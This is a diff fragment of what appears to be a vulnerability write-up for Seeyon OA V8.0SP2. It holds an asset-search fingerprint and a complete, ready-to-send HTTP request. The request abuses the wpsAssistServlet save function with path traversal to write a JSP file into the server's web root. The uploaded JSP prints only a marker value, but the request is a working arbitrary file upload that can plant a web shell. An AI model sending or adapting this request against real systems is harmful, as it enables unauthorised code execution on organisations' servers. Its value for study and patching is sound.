@@ -48,20 +48,20 @@ app="致远互联 - OA" && title="V8.0SP2"
 漏洞数据包：
 
 ```
-POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2 HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: close
-Content-Length: 217
-Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
+POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 217
+Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
 
 --a4d7586ac9d50625dee11e86fa69bc71
-Content-Disposition: form-data; 
-Content-Type: application/vnd.ms-excel
+Content-Disposition: form-data; 
+Content-Type: application/vnd.ms-excel
 
-<% out.println("215882935");%>  
+<% out.println("215882935");%>  
 --a4d7586ac9d50625dee11e86fa69bc71--
 
 
